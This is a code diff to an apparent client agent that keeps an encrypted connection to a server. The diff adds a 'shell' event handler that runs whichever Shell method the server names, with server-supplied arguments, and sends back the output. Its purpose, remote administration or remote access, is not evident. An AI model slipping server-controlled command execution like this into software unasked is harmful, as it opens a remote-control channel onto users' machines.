@@ -9,6 +9,7 @@ import threading
 
 from infos import *
 from config import *
+from shell import Shell
 from tasks import *
 
 from utils import Logger, decrypt, encrypt, MessageEncoder, MessageDecoder
@@ -114,8 +115,8 @@ class Client:
                         data = encrypt(data, self.key)
                     data = struct.pack('!L', len(data)) + data
 
-                except json.JSONDecodeError as e:
-                    self.logger.warning("Failed to convert dict to JSON object: {}".format(e))
+                except Exception as e:
+                    self.logger.warning("Failed to serialize dict: {}".format(e))
                     continue
 
                 self.s.sendall(data)
@@ -200,7 +201,7 @@ class Main:
         self.writeque = queue.Queue()
         self.running = threading.Event()
 
-        self.hashcode = None
+        self.shell = Shell()
         self.encryption_key = None
         self.tasks = []
         self.tasks_que = []
@@ -222,7 +223,6 @@ class Main:
                     event_type = data.get("event_type")
 
                     if event_type == "assign":
-                        self.hashcode = data.get("hashcode")
                         self.encryption_key = data.get("encryption_key")
 
                         if self.encryption_key:
@@ -234,15 +234,29 @@ class Main:
                             self.writeque.put(running)
 
                     else:
-                        if event_type == "info":
+                        if event_type == "shell":
+                            command = data.get("command")
+                            resp = {"event_type": "shell", "event": "output"}
+                            try:
+                                command = str(command)
+                                resp["output"] = getattr(self.shell, command)(*data.get("args"))
+                                resp["exit_code"] = 0
+
+                            except AttributeError:
+                                resp["output"] = "Command not found"
+                                resp["exit_code"] = 2
+
+                            except Exception as e:
+                                resp["output"] = "Failed to execute command {}: {}".format(command, e)
+                                resp["exit_code"] = 1
+                            self.writeque.put(resp)
+
+                        elif event_type == "info":
                             # execute utility with matching name
                             info_list = data.get("info")
                             if type(info_list) is list:
-                                resp = {}
-                                resp["event_type"] = "info"
-                                resp["info"] = data.get("info")
-                                resp["start_time"] = data.get("send_time")
-                                resp["results"] = {}
+                                resp = {"event_type": "info", "info": data.get("info"),
+                                        "start_time": data.get("send_time"), "results": {}}
                                 for info in info_list:
                                     self.logger.info("Running utility {}/{}: {}".format(info_list.index(info)
                                                                                         + 1,
